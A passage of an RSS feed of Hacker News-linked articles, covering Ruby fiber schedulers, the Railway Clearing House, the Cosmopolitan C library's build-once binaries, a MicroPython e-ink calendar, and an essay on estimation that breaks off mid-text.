<span id="cb2-5"><a href="#cb2-5"></a>        <span>return</span> RTEST(</span>
<span id="cb2-6"><a href="#cb2-6"></a>            rb_scheduler_io_wait_readable(scheduler, rb_io_from_fd(f))</span>
<span id="cb2-7"><a href="#cb2-7"></a>        );</span>
<span id="cb2-8"><a href="#cb2-8"></a>    }</span>
<span id="cb2-9"><a href="#cb2-9"></a></span>
<span id="cb2-10"><a href="#cb2-10"></a>    <span>// rest of function for if no scheduler was defined</span></span>
<span id="cb2-11"><a href="#cb2-11"></a>}</span></code></pre></div>
<p>This snippet also demonstrates how to get a Ruby <code>IO</code> object out of a file descriptor: with <code>rb_io_from_fd()</code>.</p>
<h2 id="drawbacks-of-fibers">Drawbacks of Fibers</h2>
<p>The current implementation does still have some drawbacks. For one, fibers are thread-local and cannot be moved between threads (yet). (For the purposes of this paragraph, you can also read “Ractor” wherever I wrote “thread”.) This means that any system that wants to scale beyond a single thread will have to run multiple threads, each with their own …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</a></em></p>]]>
            </description>
            <link>http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560894</guid>
            <pubDate>Mon, 28 Dec 2020 17:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Railway Clearing House (1936)]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25560849">thread link</a>) | @jpkoning
<br/>
December 28, 2020 | https://www.railwaywondersoftheworld.com/clearing-house.html | <a href="https://web.archive.org/web/*/https://www.railwaywondersoftheworld.com/clearing-house.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="txt_560">
        <p>Checking Rail Transport Revenue</p>
        
        <p><a href="https://www.railwaywondersoftheworld.com/britain.html">RAILWAYS OF BRITAIN -<wbr> 22</a></p>
        
        <p><img alt="Sorting railway tickets in the Railway Clearing House" title="Sorting railway tickets in the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpf5eb4ce3_05_06.jpg" id="pic_1234"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>SORTING TICKETS in the Railway Clearing House is carried out by a large staff of highly skilled employees. The function of the Railway Clearing House is to clear or to apportion the receipts of the through traffic of Great Britain’s railways and of certain Irish lines and ports. Some 23,000 miles of rail routes come under the scope of the Railway Clearing House system.</p>
        
        
        
        <p>A PROSPECTIVE passenger can walk into any station booking-<wbr>office in Great Britain and purchase a ticket for practically any other station in the country -<wbr> and that ticket will take him right through to his destination, irrespective of the ownership of the lines over which he may have to travel.</p>
        
        <p>The traveller may buy a ticket at Dover, on the Southern Railway, for -<wbr> say, Oban, served by the LMS. How is the ticket money shared?</p>
        
        <p>Again, a train of goods wagons on any line will often bear the initials of all the railway companies -<wbr> GWR, LMS, LNER, SR. How is carriage paid for on the goods in these wagons -<wbr> running as they do over the lines of other companies?</p>
        
        <p>In both instances settlement is made through the <a href="https://en.wikipedia.org/wiki/Railway_Clearing_House">Railway Clearing House</a>. The story of the RCH, as it is usually known, goes back to the very early days of railway operation. At first there was no provision for through booking by passengers. It was not possible to send goods throughout the journey in the same wagon.</p>
        
        <p>The travelling public soon began to demand the convenience of through booking. Merchants, too, dissatisfied with the loss and delay occasioned by transhipping goods from one company’s wagons to those of another, agitated for a system of through-<wbr>invoicing for goods traffic. The railways were forced to give facilities to meet the general demand, but for a time the difficulties of settlement between the various companies were a bar to progress.</p>
        
        <p>It is uncertain whether the credit for the idea of a central office to deal with the settlement of through accounts is due to <a href="http://en.wikipedia.org/wiki/George_Glyn,_1st_Baron_Wolverton">Mr. George Carr Glyn</a> (afterwards Lord Wolverton), chairman; to <a href="http://en.wikipedia.org/wiki/Robert_Stephenson">Mr. Robert Stephenson</a> (son of George Stephenson), engineer; to Mr. Kenneth Morison, chief of audit department, all of the <a href="https://en.wikipedia.org/wiki/London_and_Birmingham_Railway">London and Birmingham Railway</a>, or to <a href="http://en.wikipedia.org/wiki/James_Joseph_Allport">Sir James Allport</a> of the Midland Railway. Mr. Glyn, however, the banker, who was, of course, familiar with the methods of the historic Bankers’ Clearing House for the settlement of financial transactions, without doubt wholeheartedly supported the idea.</p>
        
        <p>The Railway Clearing House was accordingly established on January 2, 1842. From that date travelling facilities began to expand.</p>
        
        <p>A staff of four men formed the nucleus of the Clearing House, which was situated in Drummond Street, opposite the present main entrance to Euston Station, a London terminus of the LMS. Business was carried on at Drummond Street until 1848, when the first block of the present building in Seymour Street, Euston Square, was built.</p>
        
        <p>The first secretary of the Clearing House was Mr. Kenneth Morison. Nine railway companies were admitted to participate in the business. They were the London and Birmingham, Midland Counties, Birmingham and Derby Junction, North Midland, Hull and Selby, Manchester and Leeds, Leeds and Selby, York and North Midland, and Great North of England. These companies have long since been merged in the constituent companies of the LMS or LNER.</p>
        
        <p><img alt="Old documents in the muniment room of the Railway Clearing House" title="Old documents in the muniment room of the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpa5fb7576_05_06.jpg" id="pic_1235"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>OLD DOCUMENTS are stored in the muniment room of the Railway Clearing House, seen in the above picture. The Railway Clearing House is divided into three main departments -<wbr> the Secretarial, the Merchandise, and the Coaching sections.</p>
        
        
        
        <p>The traffic receipts handled by the original Clearing House were those for the through conveyance of goods, passengers, parcels and live stock between London and Darlington in one direction and between Manchester and Hull in the other.</p>
        
        <p>The railways included in the RCH system had increased by 1845 to sixteen, with 656 route-<wbr>miles of track. The difficulties of obtaining cash settlement between the railway companies and the clearing house, led in 1850 to the passing of an <a href="http://www.railwaysarchive.co.uk/documents/HMG_Act_Clear1850.pdf">Act of Parliament</a> conferring on the RCH the right to sue in the courts. This ended the trouble and the companies subsequently settled all payments promptly.</p>
        
        <p>The Railway Clearing House was Incorporated by Act of Parliament in 1897. From its beginning it had been under the control of a Committee consisting of one delegate from each of the companies under the system. Changes were made, however, under the Railway Clearing House Amalgamation Scheme of 1922.</p>
        
        <p>The corporation now consists of four delegates from each of the four great amalgamated companies and one from each of the other companies, namely the London Passenger Transport Board, Mersey Railway, the lines of the Joint Committees, and the Irish Companies. An executive or “Superintending Committee” of eight members is elected from the delegates of the corporation.</p>
        
        <p>The number of companies working under the RCH system to-<wbr>day is fifteen, with a total route length of 23,000 miles -<wbr> a figure in striking contrast to the 656 miles of 1845. The receipts of the Clearing House for 1842 were £193,246; for 1933 the amount involved was over £34,000,000, an equally striking comparison.</p>
        
        <p>The work of the Railway Clearing House is divided into three Departments -<wbr> Merchandise, Coaching, and Secretarial.</p>
        
        <p>The Merchandise Department apportions the receipts from the carriage of goods, minerals, and livestock. Coal traffic was formerly settled through the Clearing House, but adjustments are now made by the originating Company, which collects the charges and pays out the other companies' proportions.</p>
        
        <p>The first function of the Railway Clearing System is to ensure that charges in which two or more companies are concerned are correctly accounted for at both terminal stations, from which the respective agents send information each month to the Clearing House. Any differences between the two sets of accounts are then settled by correspondence through the Audit offices.</p>
        
        <p>Perhaps the best means of understanding the system will be to consider, for example, a consignment of goods from Bristol (LMS) to Southampton (Southern) via The Somerset and Dorset Joint (between Bath and Templecombe).</p>
        
        <p>We will assume that the load weighs 10 tons and the charge is £10, of which half is “paid” at Bristol and the other half “to be paid” at Southampton. On making a settlement there are three companies to share in the receipt of £10 -<wbr> the LMS (Bristol to Bath), the Somerset and Dorset Joint (Bath to Templecombe), and the Southern Railway (Templecombe to Southampton).</p>
        
        <p>The first adjustment to be made on the accounts is that relative to what are known as “terminal services”, such as collection and delivery charges. The balance of the total charges is usually divided on a mileage basis, according to the distance the load is carried over each of the railways. There are, however, a number of exceptions to this principle, such as agreed apportionments, fixed tolls on tonnage, and other special methods of division.</p>
        
        <p>The above example might be clearly expressed by the following tabulation:</p>
        
        
        
        
        
        
        
        
        
        
        <p>This leaves a residue from £10 of £7 13s 4d, which is divided on a mileage basis, taking the total distance at 100 miles -<wbr> 10 miles on the LMS, 30 miles on the Somerset and Dorset Joint, and 60 miles on the Southern Railway.</p>
        
        <p>The apportionment of the £7 13s 4d would then be as follows:</p>
        
        
        
        
        
        
        
        
        
        
        
        <p>The final balance payable to each company would thus be:</p>
        
        
        
        
        
        
        
        
        
        
        
        
        <p>If there had been traffic in the reverse direction, the two entries would have been combined in one settlement to cover both “up” and “down” traffic.</p>
        
        <p>To minimize the clerical work involved, it is now the practice to limit individual division to the larger monthly sums, and to make a bulk settlement of the smaller monthly amounts. In practice, the larger amounts are not divided in detail until the close of the half years ended June and December. Each month “interim” accounts are brought out and payments made “on account” to the companies concerned, subject to adjustment at the half-<wbr>yearly settlement.</p>
        
        <p>Excursion Traffic</p>
        
        <p>The bulk settlement of small amounts is made on a basis of total receipts per pair of companies, irrespective of route. After a percentage deduction for terminal charges, the remainder is divided half-<wbr>yearly, on an agreed formula. This is done to avoid many separate calculations. Since in each half year there are as many as three million transactions, three-<wbr>fourths of are which “small”, the saving of work will be obvious.</p>
        
        <p>Passenger traffic is dealt with through the Railway Clearing House on different lines, and is divided by its Coaching …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.railwaywondersoftheworld.com/clearing-house.html">https://www.railwaywondersoftheworld.com/clearing-house.html</a></em></p>]]>
            </description>
            <link>https://www.railwaywondersoftheworld.com/clearing-house.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560849</guid>
            <pubDate>Mon, 28 Dec 2020 17:05:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan C library: build-once run-anywhere]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560619">thread link</a>) | @fanf2
<br/>
December 28, 2020 | https://justine.lol/cosmopolitan/ | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">» jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560619</guid>
            <pubDate>Mon, 28 Dec 2020 16:43:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building an E-Ink Calendar and a UI Toolkit along the way]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25560570">thread link</a>) | @rahulrav
<br/>
December 28, 2020 | https://rahulrav.com/blog/e_ink_dashboard.html | <a href="https://web.archive.org/web/*/https://rahulrav.com/blog/e_ink_dashboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <main>
            <div>
              <div>
                <p>December 27 2020, Monday</p>
<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>
              </div>
            </div>
            
          </main>
          
          
          
        </div></div>]]>
            </description>
            <link>https://rahulrav.com/blog/e_ink_dashboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560570</guid>
            <pubDate>Mon, 28 Dec 2020 16:38:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Accurate Estimations]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560386">thread link</a>) | @1penny42cents
<br/>
December 28, 2020 | https://camhashemi.com/2020/12/28/accurate-estimations/ | <a href="https://web.archive.org/web/*/https://camhashemi.com/2020/12/28/accurate-estimations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-269">
			<!-- .entry-header -->
		<div>
		
<p>We’re constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we’re horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don’t know what we don’t know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they’re instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‘adding some buffer’. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it’s impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don’t know what we don’t know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there’s a strong social problem. Let’s imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project’s deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you’re giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it’ll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client’s estimate got them paid.</p>



<p>I’ve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



